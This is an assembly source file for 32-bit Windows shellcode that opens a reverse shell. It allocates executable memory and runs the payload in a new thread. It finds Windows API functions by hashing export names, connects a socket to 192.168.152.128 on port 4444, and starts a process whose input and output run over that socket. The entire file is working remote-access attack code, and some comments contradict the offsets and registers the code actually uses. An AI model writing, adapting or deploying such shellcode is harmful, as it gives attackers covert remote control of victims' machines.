[BITS 32]

global _start

_start:

	cld				;clear direction flags
;LPVOID WINAPI VirtualAlloc(  _In_opt_  LPVOID lpAddress,  _In_      SIZE_T dwSize,  _In_      DWORD flAllocationType,  _In_      DWORD flProtect)
;VirtualAlloc	0x54CAAF91
	xor eax,eax
	mov esi,0x159			; shellcode size
	push byte 0x40			; 0x40 PAGE_READ/WRITE_EXECUTE
	push 0x1000			; MEM_COMMIT
	push esi			; PUSH SIZE
	push eax			; address = NULL
	push 0x91AFCA54
	call api_call

	mov edx,eax			; edx = &memory
	mov edi,eax			; prepare edi with memory address for rep movsb
	mov ecx,esi			; put size in ecx

	call payload
save:
	pop esi				;save address of payload in memory
	rep movsb			; move bytes from address at esi to addr at edi untill ecx is zero
	call thread			;


thread:
;CreateThread(lpthreadatrributes,dwstacksize,lpstartaddress,lpparameter,dwcreateionflag,lpthreadid)
;CreateThread(*SECURITY_ATTRIBUTES,0,address of accept,0,0,NULL)
	xor eax,eax
	push eax		; lpthreadid = NULL
	push eax		; dwcreationflag = 0
	push eax		; lpparameter = NULL
	push edx		; start address of thread
	push eax		; dwstacksize	= NULL
	push eax		; lpthreadattributes = NULL
	push 0xCA2BD06B         ; push hash of createthread()
    call api_call           ; call createthread()

	pop eax					;pop threadid returned so process will run and return when done 
payload:
	call save
	cld						; clear direction flag
	call start				; call start
; Input: The hash of the API to call and all its parameters must be pushed onto stack.
; Output: The return value from the API call will be in EAX.
; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
; Note: This function is unable to call forwarded exports.	
api_call:

	pushad			;save all registers
	mov ebp,esp		; set ebp to stack frame pointer
	xor edx,edx		
	mov edx,[fs:edx+0x30]	; edx = PEB
	mov edx,[edx+0x0c]		; edx = PEB.ldr
	mov edx,[edx+0x14]		; edx = PEB.ldr.InMemoryOrderList.flink
next_mod:
	mov esi,[edx+0x28]		; esi = modulename in unicode
	push edx				; save position in order list on stack
	mov edx,[edx+0x10]		; get this module base addr
	mov eax,[edx+0x3c]		; jmp over PE Header
	mov eax,[edx+eax+0x78]	; eax = RVA of Export Table
	test eax,eax				; if export table doesnt exist
	jz get_next_mod1
	; if eat exists
	add eax,edx				; add module base address to Export Table RVA ; eax = &export table
	push eax				; save  export table address on stack
	mov ecx,[eax+0x18]		; load ecx with the number of functions in module
	mov ebx,[eax+0x20]		; ebx = names table RVA
	add ebx,edx				; ebx = &names table
get_next_func:
	jecxz get_next_mod
	dec ecx					; decrease ecx
	mov esi,[eax+4*ecx]		; esi = current name RVA
	add esi,edx				; esi = &name
	xor edi,edi				; edi = 0 to hold the function hash 
	xor eax,eax
loop_funcname:
	lodsb					; load byte located in esi to eax and inc esi
	test al,al				; check if al = NULL reached endof string
	jz compute_hash_finished
	ror edi,0xd				; rotate hash accumulator 13 bits to the right
	add edi,eax				; add byte from eax to edi
	jmp loop_funcname		; loop till end of string reached
compute_hash_finished:
	cmp edi,[esp+0x24]		; compare computed hash with reuested hash
	jnz get_next_func
	; if found fix up stack and jump to function
	pop eax					; pop current MOdule Export Table
	mov ebx,[eax+0x24]		; ebx = RVA of Ordinals table
	add ebx,edx				; ebx = &of ordinals table
	mov cx,[ebx+2*ecx]		; cx = function ordinal RVA
	mov ebx,[eax+0x1c]		; ebx  = Address table RVA
	add ebx,edx				; ebx  = &addresstable
	mov eax,[ebx + 4*ecx]	; eax = current function RVA
	add eax,edx				; eax  = &function
; we know fixup the stack and callup the function
finish:
	mov [esp+0x20],eax		; replace eax in popad with our function address
	pop ebx					; restore postiion in module list
	popad					; restore original registers
	pop ecx					; pop original caller retrun addr
	pop edx					; pop pushed hash
	push ecx				; push return address of caller so when function returns it does to the right caller
	jmp eax					; jmp to &function
get_next_mod:
	pop eax
get_next_mod1:
	pop edx						; pop our position in list
	mov edx,[edx]				; get next entry in module list
	jmp short next_mod		
start:
	pop ebp					; save address of api_call in ebp

; get functions in ws2_32.dll
;ws2_32.dll		77 73 32 5f 33 32 2e 64 6c 6c
	xor eax,eax
	push 0xff206c6c			; push ws2_32.dll to stack
	push 0x642e3233
	push 0x5f327377
	add [esp+0xA],al		; put null byte at end of string
	push esp				; push null terminated string
	push 0xec0e4e8e			; push loadlibraryA hash
	call ebp				; call loadLibraryA(ws2_32.dll)
;WSAStartup(WORD wVersionRequested,struct LPWSADATA lpWSAData)
	xor edx,edx				; zero out eax
	mov dh,0x03				; set edx = 0x00000300 because LPWSDATA needs 300 bytes on stack
	sub esp,edx				; save space on stack
;initialize WSAStatrup socket
	xor ecx,ecx
	inc ecx	
	inc ecx
	push esp				; push the stack space which is gonna be used by function
	push ecx				; wVersionRequested = 2
	push 0x3BFCEDCB			; push WSAStartup hash 
	call ebp				; call it
	add esp,0x0300			; restore stack to original position
;WSASocket(int af,itn type,int protocol, lpprotocolinfo,group g,DWORD dwflags)
;WSASocket(2,1,0,0,0,0)
		xor eax,eax		; zero out eax
	push eax		; dwflags = 0
	push eax		; g = 0
	push eax		; lpprotocolinfo = NULL
	push eax		; protocol = 0
	inc eax			; eax = 1
	push eax		; type = 1 = SOCK_STREAM
	inc eax			; eax = 2
	push eax		; af = 2 = AF_INET
	push 0xADF509D9	; push WSASocketA hash
	call ebp		; call WSASocket
	mov esi,eax		; save socket file discriptor in esi
;Connect(socket s,struct sockaddr *name, namelen)
;Connect(esi,struct *sockaddr_in,lenght)
;initalize struct sockaddr_in
;sockaddr_in{sin_family,sin_port,struct in addr sin_addr,sin_zero}
	xor eax,eax		; zeor out eax
	push eax		; sin_zero = NULL
	push 0x8098A8C0 	; push address in network bytes format for struct in_addr (192.168.152.128)
	mov eax,0x5c110102	; put the port in networkbytes format in eax 4444 = 5c11 the extra 0102 will be decresed to become 0002 the sinfamily since the size is word of sin-family and sin_port
	dec ah			;decresed the 0102 as explained above
	push eax		; push the sin_port and sin_family
	mov ebx,esp		; put the pointer to struct on stack to ebx
;struct end
	mov al,0x10		; let eax = 0x10 which 16 decimal - size of struct 
	push eax		; push value of namelen 0x10
	push ebx		; push struct sockaddr_in
	push esi		; push socke file descriptor returned by WSASocketA
	push 0x60AAF9EC	; push connect() hash
	call ebp		; call connect()
;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
;struct STARTUPINFO{cb,lpreserved,lpdesktop,lptitle,dwx,dwy,dwxsize,dwysize,dwxcountchars,dwycountchars,dwfillattribute,dwflages,wshowwindow,cbreserved2,lpreserved2,hstdInput,hStdOutput,hStdError}
;struct PROCESSINFORMATION{hProcess,hThread,dwProcessId,dwThreadId}
;structs initalization
	xor ecx,ecx	
	mov cl,0x54		; ecx holds the size of both struct STARTUPINFO & PROCESSINFO
	sub esp,ecx		; save sace on stack for structs
	mov esi,esp		; edi holds pointer to struct
	push edi		; save pointer on stack
	xor eax,eax		
	rep stosb		; fill bytes in edi with bytes at eax till ecx = 0 ( fill out out structs with 00
	pop edi			; restore original struct position
; structs initialization end
; struct STARTUPINFO data insertion
	mov byte [edi],0x44		; mov byte 0x44 to address pointed to by edi cb = 0x44
	inc byte [edi+0x2D]		; ; increase byte at edi+0x38 to 1 to set dwFlags attribute to STAT_USESTDHANDLE tp indicate the hStd handles will be use
	push edi				; save STARTUPINFO struct postiion on stack
	mov eax,esi				; move the socket file descriptor to eax
	lea edi,[edi+0x38]		; load address of hstd's arguments into edi
	stosd					; store dword at  eax in address pointed to by edi hStdinput = socket file descriptor
	stosd					; hStdOuptut = socket file descriptor
	stosd					; hStdError = socket file descriptor
	pop edi					; resotre original struct postion
;struct STARTUPINTO end
	lea esi,[edi+0x44]		; load effective address of [edi + 0x44] into esi esi = PROCESSINFO struct
;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
	xor eax,eax		; zero out eax 
	push esi		; push the pointer to the PROCESSINFORMATION struct to lpProcessInformation attribute
	push edi		; push the pointer to the STARTUPINFORMATION struct to lpStartupinfo attribute  
	push eax		; set lpstartupdirectory to NULL
	push eax		; set the lpEnviroment to NULL
	push eax		; set the dwcreationflag to 0
	inc eax			; eax = 1
	push eax		; set bInheritHandles argument to TRUE since client need to inherit the socket file descriptor
	dec eax			; eax = 0
	push eax		; set lpthreadAttributes argument as NULL
	push eax 		; set lpProcessAttributes argument as NULL
	push DWORD [ebp+0x2c]		; set the lpcommandline argument to cmd saved at [ebp+0x2c]
	push eax		; set lpApplicationName argument to NULL
	push 0x16B3FE72		; push createProcessA hash
	call ebp
;exitprocess	0x7ED8E273
;	push 0x73E2D87E
;	call ebp

;0xE4CFCDE8              GetCurrentThread
	push 0xE8CDCFE4		; GetCuurentThread() hash	
	call ebp		; call it current thread handle is in eax
;0x896F01BD              TerminateThread
	xor ecx,ecx		; zero out ecx
	push ecx		; dw milliseconds = 0
	push eax		; push current thread handle
	push 0xBD016F89		; push TerminateThread() hash
	call ebp		; call TerminateThread(handle,dwmilliseconds)
	nop
	nop
exit:
	
